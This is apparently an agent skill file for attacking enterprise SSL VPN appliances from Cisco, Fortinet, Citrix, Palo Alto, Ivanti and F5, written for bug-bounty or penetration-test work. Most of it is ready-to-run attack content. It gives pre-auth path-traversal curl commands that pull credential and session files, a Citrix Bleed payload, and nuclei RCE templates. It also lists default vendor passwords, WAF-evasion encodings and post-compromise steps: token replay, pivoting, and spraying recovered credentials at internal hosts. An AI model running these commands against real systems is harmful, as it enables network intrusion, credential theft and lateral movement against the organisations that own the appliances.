---
name: hunt-vpn
description: Enterprise SSL VPN attack - vendor fingerprinting, CVE matrix (Cisco, Fortinet, Citrix, Palo Alto, Pulse/Ivanti), default credentials, pre-auth exploit commands. Wiki-first, FIND schema output.
---

# Hunt: Enterprise VPN Appliances

**Assumes `hunt-core`** for the scope gate, two-account rule, confirmation gate, enumeration limits, stop conditions, wiki protocol, FIND output, and Deadends. Do not re-derive any of that here.

## Wiki

```
qmd_query "SSL VPN Fortinet Citrix Cisco Palo Alto Pulse Ivanti CVE default credentials pre-auth exploit" via wiki-search MCP
```

Hub: [[network-moc]] (live index). Primary page: [[network-service-attacks]] (VPN-protocol section: IKE aggressive-mode PSK capture, PPTP handshake capture). CVE arsenal: `wiki/cheatsheets/cve-arsenal.md` (Perimeter / VPN / edge - Fortinet/Citrix/Ivanti/PAN-OS/Cisco pre-auth CVEs with PoC). Default creds: `wiki/cheatsheets/default-credentials.md`.
Anchors: [[network-discovery]] (locating and banner-fingerprinting the exposed appliance).

## When to Use
Recon surfaces: `+CSCOE+` paths (Cisco ASA), `Set-Cookie: SVPNCOOKIE=` (Fortinet), `NSC_AAA=` (Citrix), `DSAuthSession=` (Pulse), `BIGipServer*` (F5), ports 443/8443/10443 with VPN login pages.

## Attack surface (ranked)

Work top-down; exploit the first rung that lands, do not jump to CVEs before fingerprinting.
1. **Vendor fingerprint** (cookie / header / login-page path) - which appliance, then which page below.
2. **Version fingerprint** (JS file paths, meta tags, build strings) - narrows the CVE matrix to what actually applies to this build.
3. **Default credentials** (short known-list, non-disruptive) - cheapest full-admin win, try before CVEs.
4. **Pre-auth CVE** for the fingerprinted vendor + version - file read, session-token leak, or RCE.

## Vendor Fingerprinting
```bash
# Cisco ASA / AnyConnect
curl -skI 'https://target/+CSCOE+/logon.html' | head -5

# Fortinet FortiGate
curl -skI 'https://target/remote/login' | grep -i 'set-cookie\|server'

# Citrix NetScaler / Gateway
curl -skI 'https://target/' | grep -i 'nsc_aaa\|netscaler'

# Palo Alto GlobalProtect
curl -skI 'https://target/global-protect/login.esp' | head -5

# Pulse / Ivanti Connect Secure
curl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -5

# F5 BIG-IP
curl -skI 'https://target/my.policy' | grep -i 'bigip\|mrhsession'
```

## CVE Matrix - Pre-Auth Exploits

### Cisco ASA
| CVE | Type | Command |
|-----|------|---------|
| CVE-2020-3452 | Path traversal / file read | `curl --path-as-is 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua'` |
| CVE-2018-0296 | Path traversal / session info | `curl --path-as-is 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua'` |

### Fortinet FortiGate
| CVE | Type | Command |
|-----|------|---------|
| CVE-2018-13379 | Path traversal / credential file | `curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'` |
| CVE-2024-21762 | Pre-auth RCE | `nuclei -u https://target -t cves/2024/CVE-2024-21762.yaml` |
| CVE-2023-27997 | Pre-auth RCE (XORtigate) | `nuclei -u https://target -t cves/2023/CVE-2023-27997.yaml` |

### Citrix NetScaler / ADC
| CVE | Type | Command |
|-----|------|---------|
| CVE-2023-4966 (Citrix Bleed) | Memory leak / session token | See payload below |
| CVE-2023-3519 | Pre-auth RCE | `nuclei -u https://target -t cves/2023/CVE-2023-3519.yaml` |
| CVE-2019-19781 | Path traversal / RCE | `curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'` |

**Citrix Bleed (CVE-2023-4966):**
```bash
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" \
  "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt
wc -c response.txt   # a large response only FLAGS it; grep the body for real session-token material before claiming Bleed
```

### Palo Alto GlobalProtect
| CVE | Type | Command |
|-----|------|---------|
| CVE-2024-3400 | Pre-auth RCE (OS command injection) | `nuclei -u https://target -t cves/2024/CVE-2024-3400.yaml` |

### Pulse / Ivanti Connect Secure
| CVE | Type | Command |
|-----|------|---------|
| CVE-2019-11510 | Pre-auth file read | `curl -sk 'https://target/dana-na/../dana/html5acc/guacamole/../../../tmp/system.log?/dana/html5acc/guacamole/'` |
| CVE-2024-21887 | RCE (auth required) | `nuclei -u https://target -t cves/2024/CVE-2024-21887.yaml` |

## Default Credential Check

Short known-list per vendor, non-disruptive: try each pair once after fingerprinting, before CVE attempts. This is a bounded default-cred check, not a spray - do NOT loop it into a wordlist (hunt-core enumeration limits; broad spraying is lockout-bounded and a last resort). Cross-check [[default-credentials]] first.

```bash
# Cisco ASA: admin / cisco, admin / admin
# Fortinet: admin / (blank), admin / admin
# Citrix: nsroot / nsroot
# Palo Alto: admin / admin
# F5: admin / admin, admin / default
```

## Methodology
1. Fingerprint vendor from cookie names, headers, login page content
2. Version fingerprint where possible (JS file paths, meta tags)
3. Try default credentials (non-disruptive)
4. Run nuclei templates for detected vendor + version
5. Test pre-auth path traversal CVEs with `--path-as-is` flag
6. For confirmed vulnerabilities: escalate to credential/session extraction
7. Document with version banner + curl command output as PoC
8. Distill a confirmed, reusable VPN exploit/CVE via the hunt-core distillation step, `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/network/vpn-appliances.md`.

## Chaining

A VPN foothold is network access, not the endgame. On confirmed creds / session / RCE:
- Authenticated session or admin -> pivot into the internal network the appliance fronts: [[network-pivoting-techniques]], [[pivoting-tunneling]].
- Recovered credentials (config dumps, FortiOS `sslvpn_websession`, IKE PSK) are frequently reused - spray against internal SSH/RDP/SMB and hand off to `hunt-ad`.
- Citrix Bleed / session-token leaks -> replay the token to ride an authenticated session, then continue as that user.

## Evasion

- `--path-as-is` (already in the traversal commands) stops curl collapsing `../` - mandatory for the path-traversal CVEs.
- URL-encode the traversal and marker segments when a WAF blocks the literal: `%2e%2e%2f`, `%2bCSCOE%2b` for Cisco's `+CSCOE+`, `%00`/`%0a` where the parser tolerates it.
- Hit the non-standard portal ports (8443/10443) - a WAF fronting 443 may not sit in front of them.
- Keep default-cred and CVE probes low-volume by design; do not convert either into a spray/fuzz loop.

## Confirmation gate

**NOT confirmation:** a version banner or build string that matches a CVE (that is a fingerprint, not exploitation); the VPN login page loading or a `200` on the portal; a nuclei `info`/`detected` hit with no primitive exercised; the Citrix Bleed response merely being large (`>10KB`) without session-token material actually present in the body; a default-cred login form that renders (vs a session that authenticates); a file-read path that returns `200` with an empty, shell, or error body.

**IS confirmation:** a pre-auth file read that returns the actual sensitive contents, structure matching the target file (FortiOS `sslvpn_websession` credential blob, Ivanti `system.log`, Citrix `smb.conf`); Citrix Bleed returning real session-token material you can replay into an authenticated session; default creds that land you on an authenticated admin / management page; a pre-auth RCE whose command output you observe inline or out-of-band - reproduced in a clean session per hunt-core.

A version match alone is a lead to exploit, never a finding. Demonstrate the primitive or it stays out of the FIND queue.

## Severity

Rated on the primitive demonstrated, not the version detected.

| Outcome | Typical |
|---|---|
| Pre-auth RCE / OS command injection | critical |
| Pre-auth file read of credential or session material (config, `sslvpn_websession`, Citrix Bleed token) | critical |
| Auth bypass to admin (e.g. CVE-2022-40684) | critical |
| Default credentials authenticate to admin / management | high (critical if internet-facing admin) |
| Version confirmed vulnerable, exploit not demonstrated | not a FIND - lead only (see confirmation gate) |
